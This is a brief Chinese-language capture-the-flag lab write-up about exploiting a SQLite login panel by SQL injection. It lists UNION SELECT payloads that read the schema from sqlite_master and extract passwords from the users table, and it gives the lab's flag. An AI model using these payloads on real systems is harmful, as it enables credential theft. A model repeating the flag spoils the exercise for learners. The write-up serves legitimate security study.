# lab_Normal Login Panel_Flag 1

1. 這題可以看到是一個登入介面，猜測這邊是要 SQL injection ，然後輸入嘗試輸入一些 SQL injection 的指令碼，像是 'OR 1=1 *--* ，但會沒辦法登入，並且下面會顯示出錯誤訊息。

![截圖 2022-12-19 上午1.25.49.png](lab_Normal%20Login%20Panel_Flag%201%20f8094d763ec14f51997114071556e321/%25E6%2588%25AA%25E5%259C%2596_2022-12-19_%25E4%25B8%258A%25E5%258D%25881.25.49.png)

1. 接下來嘗試去 union select ，然後可以試到 admin' union select 1,2,3,4 - - 的時候， 並且會在第四個 column 跟 login failed count : 後面的那個數字同步，推測這邊是我們要利用的點。

![截圖 2022-12-19 上午1.46.01.png](lab_Normal%20Login%20Panel_Flag%201%20f8094d763ec14f51997114071556e321/%25E6%2588%25AA%25E5%259C%2596_2022-12-19_%25E4%25B8%258A%25E5%258D%25881.46.01.png)

![截圖 2022-12-19 上午1.46.35.png](lab_Normal%20Login%20Panel_Flag%201%20f8094d763ec14f51997114071556e321/%25E6%2588%25AA%25E5%259C%2596_2022-12-19_%25E4%25B8%258A%25E5%258D%25881.46.35.png)

1. 然後講師有說這邊的 SQL 是 SQL lite ，所以我們直接用 SQL lite 的 SQL injection 去以下一個個嘗試：

```python
admin' union select 1,2,3,sql from sqlite_master limit 1,1 —
admin' union select 1,2,3,sql from sqlite_master limit 4,1 —
admin' union select 1,2,3,password from users limit 1,1 —
admin' union select 1,2,3,password from users limit 2,1 —
admin' union select 1,2,3,password from users limit 3,1 —
admin' union select 1,2,3,password from users limit 3,1 —
admin' union select 1,2,3,sql from sqlite_master limit 1,1 --
admin' union select 1,2,3,password from users limit 1,1 --
admin' union select 1,2,3,password from * limit 1,1 --4

```

4. 最後，試了以下這一段指令後，成功獲得 FLAG{Un10N_s31eCt/**/F14g_fR0m_s3cr3t}。

```python
admin' union select 1,2,3,password from users limit 0,1 --

```

![截圖 2022-12-19 上午2.01.28.png](lab_Normal%20Login%20Panel_Flag%201%20f8094d763ec14f51997114071556e321/%25E6%2588%25AA%25E5%259C%2596_2022-12-19_%25E4%25B8%258A%25E5%258D%25882.01.28.png)